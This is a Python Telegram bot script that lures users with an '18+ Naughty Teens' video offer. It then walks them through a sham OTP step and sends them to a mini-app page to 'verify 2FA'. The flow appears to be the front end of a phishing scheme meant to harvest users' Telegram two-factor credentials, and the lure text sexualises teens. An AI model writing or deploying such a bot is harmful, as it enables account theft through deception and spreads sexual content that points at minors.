import os
import random
import asyncio
import logging
from dotenv import load_dotenv
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL")

user_otps = {}


def generate_otp():
    return str(random.randint(10000, 99999))


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} started the bot")
    keyboard = [
        [KeyboardButton("🔞 Watch 18+❤️", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏 Watch Now! 👇",
        reply_markup=reply_markup
    )


async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.effective_message.web_app_data.data
    user_id = update.effective_user.id
    logger.info(f"Received data from user {user_id}: {data}")
    
    if data.startswith("request_otp:"):
        otp = generate_otp()
        user_otps[user_id] = otp
        logger.info(f"Generated OTP {otp} for user {user_id}")
        await update.effective_message.reply_text(
            f"🔢 Your OTP is: <code>{otp}</code>\n\nPlease enter this code in the mini app!",
            parse_mode='HTML'
        )
    elif data.startswith("verify_otp:"):
        otp_entered = data.split(":")[1]
        logger.info(f"User {user_id} entered OTP: {otp_entered}, stored OTP: {user_otps.get(user_id)}")
        
        if user_id in user_otps and user_otps[user_id] == otp_entered:
            # Send 2FA button
            keyboard = [
                [KeyboardButton("🔐 Verify 2FA", web_app=WebAppInfo(url=MINI_APP_URL + "/twofa.html"))]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.effective_message.reply_text(
                "✅ OTP verified successfully! Now click below to verify 2FA.",
                reply_markup=reply_markup
            )
        else:
            error_msg = "❌ Invalid OTP, please try again!"
            if user_id not in user_otps:
                error_msg += "\n(No OTP found - please request a new one!)"
            await update.effective_message.reply_text(error_msg)
    elif data.startswith("verify_2fa:"):
        await update.effective_message.reply_text("✅ 2FA verified successfully! You're now logged in! Enjoy the videos! 🎉")


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    
    application.run_polling()


if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main()
